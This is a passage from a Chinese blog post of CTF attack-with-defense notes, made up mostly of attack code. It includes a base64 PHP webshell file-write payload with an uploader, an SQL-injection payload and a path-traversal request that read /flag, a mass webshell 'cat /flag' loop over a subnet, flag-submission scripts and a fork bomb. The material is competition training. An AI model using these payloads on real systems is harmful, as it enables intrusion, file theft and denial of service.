class="string">'QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0+fCIpOzsKJGY9YmFzZTY0X2RlY29kZSgkX1BPU1RbInoxIl0pOwokYz1iYXNlNjRfZGVjb2RlKCRfUE9TVFsiejIiXSk7CiRjPXN0cl9yZXBsYWNlKCJcciIsIiIsJGMpOwokYz1zdHJfcmVwbGFjZSgiXG4iLCIiLCRjKTsKJGJ1Zj0iIjsKZm9yKCRpPTA7JGk8c3RybGVuKCRjKTskaSs9MSkKICAgICRidWYuPXN1YnN0cigkYywkaSwxKTsKZWNobyhAZndyaXRlKGZvcGVuKCRmLCJ3IiksJGJ1ZikpOwplY2hvKCJ8PC0iKTsKZGllKCk7'</span></div><div class="line">                data[<span class="string">'z1'</span>]=target_path_base64</div><div class="line">                data[<span class="string">'z2'</span>]=base64.b64encode(local_content)</div><div class="line">                response = post(posturl, data)</div><div class="line">                <span class="keyword">if</span> response:</div><div class="line">                    <span class="built_in">print</span> <span class="string">'[+] '</span>+target_file_url+<span class="string">', upload succeed!'</span></div><div class="line">                <span class="keyword">else</span>:</div><div class="line">                    <span class="built_in">print</span> <span class="string">'[-] '</span>+target_file_url+<span class="string">', upload failed!'</span></div><div class="line">            <span class="keyword">else</span>:</div><div class="line">                <span class="built_in">print</span> <span class="string">'[-] '</span>+posturl+<span class="string">', unsupported webshell!'</span></div><div class="line">        except Exception,e:</div><div class="line">            <span class="built_in">print</span> <span class="string">'[-] '</span>+posturl+<span class="string">', connection failed!'</span></div><div class="line">    shell_file.close()</div><div class="line">  </div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:  </div><div class="line">    main()</div></pre></td></tr></table></figure>
<p>(2) 或者直接执行下面的脚本</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#!/bin/bash</span></div><div class="line"><span class="keyword">while</span> <span class="literal">true</span></div><div class="line"><span class="keyword">do</span></div><div class="line">	flag=$(curl <span class="string">'http://172.16.4.42:800'</span>)</div><div class="line">	curl --cookie <span class="string">"PHPSESSID=21il7pum6i3781pumljhv578c1; xdgame_username=%E5%B0%8F%E7%BA%A2%E5%B8%BD"</span> --data <span class="string">"key="</span><span class="variable">$&#123;flag&#125;</span> <span class="string">"http://172.16.4.42/index.php/wargame/submit"</span></div><div class="line">	sleep 1s</div><div class="line"><span class="keyword">done</span></div></pre></td></tr></table></figure>
<p>(3) 有些SQL注入漏洞可以通过sqlmap利用—sql-shell 执行<code>select load_file(&#39;/flag&#39;)</code>来获取flag。最好直接利用脚本来获得。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sqli</span><span class="params">(host)</span>:</span></div><div class="line">    <span class="keyword">global</span> sess_admin</div><div class="line">    data = &#123;<span class="string">"section_name"</span>:<span class="string">"asd"</span>,<span class="string">"admin_name"</span>:<span class="string">"'||(SELECT updatexml(1,concat(0x7e,(select load_file('/flag')),0x7e),1))||'"</span>,<span class="string">"announcement"</span>:<span class="string">"asd"</span>&#125;</div><div class="line">    r = sess_admin.post(<span class="string">'http://%s/index.php/section/add'</span>%host,data=data)</div><div class="line">    flags = re.findall(<span class="string">r'~(.+?)~'</span>,r.content)</div><div class="line">    <span class="keyword">if</span> flags:</div><div class="line">        <span class="keyword">return</span> flags[<span class="number">0</span>]</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="keyword">return</span> <span class="string">"error pwn!"</span></div></pre></td></tr></table></figure>
<p>(4) 文件包含漏洞，直接可以通过../../../../../../flag的方式获取</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">def include(host):</div><div class="line">    r = requests.get(url=<span class="string">"http://%s/?t=../../../../../../flag"</span>%host)</div><div class="line">    flags = re.findall(r<span class="string">'^(.+?)&lt;'</span>,r.content)</div><div class="line">    <span class="keyword">if</span> flags:</div><div class="line">        <span class="built_in">return</span> flags[0]</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="built_in">return</span> <span class="string">"error pwn!"</span></div></pre></td></tr></table></figure>
<p>(5)批量提交flag的脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python2</span></div><div class="line"><span class="keyword">import</span> sys</div><div class="line"><span class="keyword">import</span> json</div><div class="line"><span class="keyword">import</span> urllib</div><div class="line"><span class="keyword">import</span> httplib</div><div class="line">server_host = <span class="string">'10.10.0.2'</span></div><div class="line">server_port = <span class="number">80</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">submit</span><span class="params">(team_token, flag, host=server_host, port=server_port, timeout=<span class="number">5</span>)</span>:</span></div><div class="line">    <span class="keyword">if</span> <span class="keyword">not</span> team_token <span class="keyword">or</span> <span class="keyword">not</span> flag:</div><div class="line">        <span class="keyword">raise</span> Exception(<span class="string">'team token or flag not found'</span>)</div><div class="line">    conn = httplib.HTTPConnection(host, port, timeout=timeout)</div><div class="line">    params = urllib.urlencode(&#123;</div><div class="line">        <span class="string">'token'</span>: team_token,</div><div class="line">        <span class="string">'flag'</span>: flag,</div><div class="line">    &#125;)</div><div class="line">    headers = &#123;</div><div class="line">        <span class="string">"Content-type"</span>: <span class="string">"application/x-www-form-urlencoded"</span></div><div class="line">    &#125;</div><div class="line">    conn.request(<span class="string">'POST'</span>, <span class="string">'/api/submit_flag'</span>, params, headers)</div><div class="line">    response = conn.getresponse()</div><div class="line">    data = response.read()</div><div class="line">    <span class="keyword">return</span> json.loads(data)</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    <span class="keyword">if</span> len(sys.argv) &lt; <span class="number">3</span>:</div><div class="line">        <span class="keyword">print</span> <span class="string">'usage: ./submitflag.py $team_token $flag'</span></div><div class="line">        sys.exit()</div><div class="line">    host = server_host</div><div class="line">    <span class="keyword">if</span> len(sys.argv) &gt; <span class="number">3</span>:</div><div class="line">        host = sys.argv[<span class="number">3</span>]</div><div class="line">    <span class="keyword">print</span> json.dumps(submit(sys.argv[<span class="number">1</span>], sys.argv[<span class="number">2</span>], host=host), indent=<span class="number">4</span>)</div></pre></td></tr></table></figure>
<p>7.批量修改ssh密码的脚本(猥琐流直接干掉几个对手)</p>
<p>8.如果有发现有预留后门，要立即使用脚本进行获取flag</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#coding=utf-8</span></div><div class="line"><span class="keyword">import</span> requests</div><div class="line">url=<span class="string">"http://192.168.71."</span></div><div class="line">url1=<span class="string">""</span></div><div class="line">shell=<span class="string">"/Upload/index.php"</span></div><div class="line">passwd=<span class="string">"abcde10db05bd4f6a24c94d7edde441d18545"</span> </div><div class="line">port=<span class="string">"80"</span></div><div class="line">payload = &#123;passwd: <span class="string">'system(\'cat /flag\');'</span>&#125;</div><div class="line">f=open(<span class="string">"webshelllist.txt"</span>,<span class="string">"w"</span>) </div><div class="line">f1=open(<span class="string">"firstround_flag.txt"</span>,<span class="string">"w"</span>)</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> [<span class="number">51</span>,<span class="number">52</span>,<span class="number">53</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">21</span>,<span class="number">22</span>,<span class="number">23</span>,<span class="number">31</span>,<span class="number">32</span>,<span class="number">33</span>,<span class="number">41</span>,<span class="number">42</span>,<span class="number">43</span>,<span class="number">71</span>,<span class="number">72</span>,<span class="number">73</span>,<span class="number">81</span>,<span class="number">82</span>,<span class="number">83</span>]: </div><div class="line">    url1=url+str(i)+<span class="string">":"</span>+port+shell</div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        res=requests.post(url1,payload,timeout=<span class="number">1</span>)</div><div class="line">        <span class="keyword">if</span> res.status_code == requests.codes.ok:</div><div class="line">            <span class="keyword">print</span> url1+<span class="string">" connect shell sucess,flag is "</span>+res.text</div><div class="line">            <span class="keyword">print</span> &gt;&gt;f1,url1+<span class="string">" connect shell sucess,flag is "</span>+res.text</div><div class="line">            <span class="keyword">print</span> &gt;&gt;f,url1+<span class="string">","</span>+passwd</div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            <span class="keyword">print</span> <span class="string">"shell 404"</span></div><div class="line">    <span class="keyword">except</span>:</div><div class="line">        <span class="keyword">print</span> url1+<span class="string">" connect shell fail"</span></div><div class="line">		</div><div class="line">f.close()</div><div class="line">f1.close()</div></pre></td></tr></table></figure>
<p>9.自写敏感功能。主办方可能已经把CMS本身的漏洞补全了，并自写了一些敏感功能，如上传、包含界面..，这时候需要自己手动去发现（利用seay代码审计工具可快速定位、ls -t按修改时间来看最新被修改的文件），分析，删除，利用。</p>
<p>10.fork炸弹</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># 参考: https://linux.cn/article-5685-1-rss.html</span></div><div class="line">:()&#123;:|:&amp;&#125;;:</div></pre></td></tr></table></figure>
<h3 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05 参考"></a>0x05 参考</h3><ul>
<li><a href="https://xianzhi.aliyun.com/forum/topic/1530/" target="_blank" rel="external">https://xianzhi.aliyun.com/forum/topic/1530</a></li>
<li><a href="http://bobao.360.cn/ctf/learning/210.html" target="_blank" rel="external">http://bobao.360.cn/ctf/learning/210.html</a></li>
<li><a href="https://mp.weixin.qq.com/s/q6xwmkADGnbHJQRbPblaHg" target="_blank" rel="external">https://mp.weixin.qq.com/s/q6xwmkADGnbHJQRbPblaHg</a></li>
<li><a href="https://www.t00ls.net/viewthread.php?tid=34681" target="_blank" rel="external">https://www.t00ls.net/viewthread.php?tid=34681</a></li>
<li><a href="http://rcoil.me/2017/06/CTF" target="_blank" rel="external">http://rcoil.me/2017/06/CTF线下赛总结</a></li>
<li><a href="https://forum.90sec.org/forum.php?mod=viewthread&amp;tid=10560" target="_blank" rel="external">https://forum.90sec.org/forum.php?mod=viewthread&amp;tid=10560</a></li>
<li><a href="http://www.freebuf.com/articles/web/118149.html" target="_blank" rel="external">http://www.freebuf.com/articles/web/118149.html</a></li>
<li><a href="https://www.secpulse.com/archives/38622.html" target="_blank" rel="external">https://www.secpulse.com/archives/38622.html</a></li>
<li><a href="http://bobao.360.cn/ctf/detail/169.html" target="_blank" rel="external">http://bobao.360.cn/ctf/detail/169.html</a></li>
</ul>

  </div>
</article>

    <div class="blog-post-comments">
        <div id="disqus_thread">
            <noscript>برای مشاهده دیدگاه‌ها، لطفا جاوااسکریپت را فعال کنید.</noscript>
        </div>
    </div>


    </div>
    
      <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">خانه</a></li>
         
          <li><a href="/About/">درباره</a></li>
         
          <li><a href="/archives/">نوشته‌ها</a></li>
         
          <li><a href="https://github.com/zer0yu">پروژه‌ها</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-AWD模式"><span class="toc-number">1.</span> <span class="toc-text">0x01 AWD模式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-出题思路"><span class="toc-number">2.</span> <span class="toc-text">0x02 出题思路</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-题目类型"><span class="toc-number">2.1.</span> <span class="toc-text">1:题目类型</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-代码类型"><span class="toc-number">2.2.</span> <span class="toc-text">2:代码类型</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-题目漏洞类型"><span class="toc-number">2.3.</span> <span class="toc-text">3:题目漏洞类型</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-出题人思路"><span class="toc-number">2.4.</span> <span class="toc-text">4:出题人思路</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-拿flag方式"><span class="toc-number">2.5.</span> <span class="toc-text">5:拿flag方式</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-防御技巧"><span class="toc-number">3.</span> <span class="toc-text">0x03 防御技巧</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04-攻击技巧"><span class="toc-number">4.</span> <span class="toc-text">0x04 攻击技巧</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x05-参考"><span class="toc-number">5.</span> <span class="toc-text">0x05 参考</span></a></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://zer0yu.github.io/2018/05/24/ctf-awd-note/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://zer0yu.github.io/2018/05/24/ctf-awd-note/&text=CTF AWD模式攻防Note"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://zer0yu.github.io/2018/05/24/ctf-awd-note/&title=CTF AWD模式攻防Note"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://zer0yu.github.io/2018/05/24/ctf-awd-note/&is_video=false&description=CTF AWD模式攻防Note"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=CTF AWD模式攻防Note&body=Check out this article: http://zer0yu.github.io/2018/05/24/ctf-awd-note/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://zer0yu.github.io/2018/05/24/ctf-awd-note/&title=CTF AWD模式攻防Note"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://zer0yu.github.io/2018/05/24/ctf-awd-note/&title=CTF AWD模式攻防Note"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://zer0yu.github.io/2018/05/24/ctf-awd-note/&title=CTF AWD模式攻防Note"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://zer0yu.github.io/2018/05/24/ctf-awd-note/&title=CTF AWD模式攻防Note"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://zer0yu.github.io/2018/05/24/ctf-awd-note/&name=CTF AWD模式攻防Note&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> منو</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> محتوا</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> اشتراک‌گذاری</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> بالا</a>
    </div>

  </div>
</div>

    
    <footer id="footer">
  <div class="footer-left">
    حق‌کپی &copy; 2019 z3r0yu
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">خانه</a></li>
         
          <li><a href="/About/">درباره</a></li>
         
          <li><a href="/archives/">نوشته‌ها</a></li>
         
          <li><a href="https://github.com/zer0yu">پروژه‌ها</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

</body>
</html>
<!-- styles -->
<link rel="stylesheet" href="/lib/font-awesome/css/fontawesome-all.min.css">
<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">

<!-- jquery -->
<script src="/lib/jquery/jquery.min.js"></script>
<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
<script src="/js/main.js"></script>
<!-- search -->

<!-- Google Analytics -->

    <script type="text/javascript">
        (function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
        ga('create', 'UA-129276044-1', 'auto');
        ga('send', 'pageview');
    </script>

<!-- Baidu Analytics -->

    <script type="text/javascript">
        var _hmt = _hmt || [];
        (function() {
            var hm = document.createElement("script");
            hm.src = "https://hm.baidu.com/hm.js?8415e69cf54ba93c9ddb2eb597859c7d";
            var s = document.getElementsByTagName("script")[0];
            s.parentNode.insertBefore(hm, s);
        })();
    </script>

<!-- Disqus Comments -->

    <script type="text/javascript">
        var disqus_shortname = 'z3r0yu';

        (function(){
            var dsq = document.createElement('script');
            dsq.type = 'text/javascript';
            dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        }());
    </script>


